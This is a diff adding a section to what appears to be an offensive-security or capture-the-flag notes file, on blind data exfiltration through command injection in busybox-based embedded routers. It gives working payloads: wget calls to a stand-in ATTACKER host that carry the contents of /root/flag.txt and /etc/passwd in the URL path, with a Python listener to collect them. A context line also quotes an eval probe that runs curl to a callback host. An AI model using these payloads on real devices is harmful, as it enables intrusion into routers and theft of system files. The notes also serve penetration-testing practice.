@@ -632,3 +632,27 @@ Python `eval`/`exec` sinks: probe `__import__("os").system("curl http://OOB/x")`
 changes, so the callback is the only proof.
 
 <!-- promoted-slug: nodejs-eval-sink-detection -->
+
+## Blind exfil on a minimal target (busybox / embedded router)
+
+The blind-exfil examples above assume `base64` exists and the shell tolerates the payload. On a
+stripped busybox target (embedded router httpd, IoT firmware) that assumption fails:
+
+- **`base64` is often absent** -> `$(id | base64)` produces nothing; exfil the raw output instead.
+- **A newline in the output breaks the GET request line** -> the substituted output must be a
+  SINGLE space-free token. Prefer files with one line (`/root/flag.txt`) or a token-yielding
+  command; avoid multi-line dumps.
+- **Put the token in the URL PATH, not a query with spaces**, to a listener you control:
+
+```
+# attacker
+python3 -m http.server 80
+# target (blind), + = URL-encoded space in the injected param:
+wget+http://ATTACKER/$(cat+/root/flag.txt)
+wget+http://ATTACKER/$(cat+/etc/passwd)     # multi-line -> only first line lands; loop per-line if needed
+```
+
+The request path in your `http.server` log is the output. Confirmed against embedded router
+web-admin command injection (see [[firmware-hardware]]).
+
+<!-- promoted-slug: busybox-blind-exfil-caveat -->
